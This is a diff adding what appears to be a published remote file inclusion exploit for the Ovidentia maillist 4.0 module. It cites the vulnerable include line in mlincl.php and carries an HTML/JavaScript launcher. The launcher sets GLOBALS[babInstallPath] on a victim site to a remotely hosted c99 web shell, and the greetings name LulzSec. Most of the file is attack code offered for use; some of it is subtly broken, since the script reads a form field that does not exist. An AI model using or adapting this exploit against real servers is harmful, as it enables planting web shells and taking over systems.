@@ -1,0 +1,64 @@
+<!--
+# Title: Ovidentia maillist 4.0 Module Remote File Inclusion Exploit
+# Author: bd0rk
+# eMail: bd0rk[at]hackermail.com
+# Twitter: twitter.com/bd0rk
+# Tested on: Ubuntu-Linux
+# Google-Dork: n/a-->Not for kiddies!
+# Download: http://www.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FAdd-ons%2FModules%2Fmaillist&file=maillist-4-0.zip&idf=794
+
+PoC:
+
+maillist-4-0/programs/mlincl.php line 4
+------------------------------------------------------------------------
+
+@include_once $GLOBALS['babInstallPath'].'utilit/registerglobals.php';
+
+------------------------------------------------------------------------
+Greetz: GoLd_M(Welcome back bro'!) :), x0r_32, Anonymous, LulzSec
+
+----------------
+~~Exploitcode~~
+----------------
+-->
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<script language="JavaScript">
+
+var a="/maillist-4-0/programs/"
+var b="mlincl.php"
+var c="?GLOBALS[babInstallPath]="
+
+var shellcode="http://yourshellpath.com/c99.txt?"
+
+function it(){
+xpl.action= document.xpl.victim.value+a+b+c+shellcode;xpl.submit();
+}
+</script>
+</head>
+
+<body bgcolor="#FFFFFF">
+<p align="middle"><font color="#0000FF"><b>Ovidentia maillist 4.0 Module Remote File Inclusion Exploit</b></font></p>
+<form method="post" name="xpl" onSubmit="it();">
+    <p align="left">
+    <b><font face="Tahoma" size="2"><font color="#FF0000">Usage</font>:http://someone/directory</a></font>
+        or
+        </font>
+        <font face="Tahoma" size="2" color="#000000">http://someone</font><font 
+size="2" face="Tahoma"></a> <font size="2">&nbps;--></font></font></b><font 
+size="2" face="Tahoma">
+        <input type="text" name="someone" size="20";"></p>
+<center>
+ 
+</p>
+  <p><input type="submit" value="GO" name="B1" style="float: left"><input type="reset" 
+value="reset" name="B2" style="float: left"></p>
+</form>
+<p><br>
+&nbps;</p>
+</center>
+</body>
+ 
+</html>
